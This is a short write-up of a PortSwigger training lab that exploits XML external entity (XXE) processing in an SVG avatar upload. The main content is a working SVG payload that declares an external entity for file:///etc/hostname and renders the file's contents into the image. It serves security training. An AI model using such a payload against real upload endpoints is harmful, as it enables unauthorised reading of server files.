# Lab: Exploiting XXE via image file upload

Lab-Link: <https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload>  
Difficulty: PRACTITIONER  
Python script: Sorry, no script (OCR from the image exceeds my python abilities for now)

## Known information

- Application allows upload of user avatars, using Apache Batik library to process image files
- Goals:
  - Create an image that displays the contents of `/etc/hostname` and submit the solution

## Steps

### Analysis

This time, the lab application is the blog website. Users can add comments to the posts, including an avatar.

For the avatar, SVG files are allowed, which is an XML based format.

### Exfiltration

As the full XML is under my control, I can freely add external entities this time. Here, I load the contents of `/etc/hostname` and render it in the image.

```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE xxx [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="150px" height="50px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Using this file as avatar and posting a comment, this comment contains a tiny avatar:

![comment](img/comment.png)

Using the browser to show the image or showing images in Burp history makes the content human readable

![solution](img/solution.png)

Submitting the solutions results in

![success](img/success.png)
